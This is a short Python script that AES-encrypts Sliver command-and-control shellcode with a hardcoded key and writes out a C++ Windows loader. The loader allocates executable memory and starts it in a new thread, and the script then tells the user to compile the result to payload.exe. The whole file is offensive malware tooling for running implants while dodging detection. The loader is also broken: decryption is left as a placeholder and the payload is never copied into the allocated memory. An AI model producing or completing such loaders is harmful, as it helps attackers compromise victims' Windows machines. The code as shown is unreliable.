import sys
import os
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Configuration
KEY = b'1234567890123456' # 16-byte key for AES-128
IV = b'1234567890123456'

def encrypt_payload(payload):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return cipher.encrypt(pad(payload, 16))

def generate_loader(encrypted_shellcode):
    # Template loader code
    loader_template = f"""
#include <windows.h>
#include <stdio.h>

unsigned char payload[] = {{{', '.join([hex(b) for b in encrypted_shellcode])}}};

int main() {{
    // 1. Allocate memory with RWX permissions
    LPVOID exec_mem = VirtualAlloc(0, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 2. Decrypt/Decrypt logic here (simplified for brevity)
    // 3. Thread injection
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}}
"""
    return loader_template

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 load.py <sliver_shellcode.bin>")
        return

    with open(sys.argv[1], 'rb') as f:
        raw_shellcode = f.read()

    encrypted = encrypt_payload(raw_shellcode)
    source_code = generate_loader(encrypted)

    with open('loader.cpp', 'w') as f:
        f.write(source_code)

    print("[+] Loader generated as loader.cpp. Compile with MinGW: x86_64-w64-mingw32-g++ loader.cpp -o payload.exe")

if __name__ == "__main__":
    main()
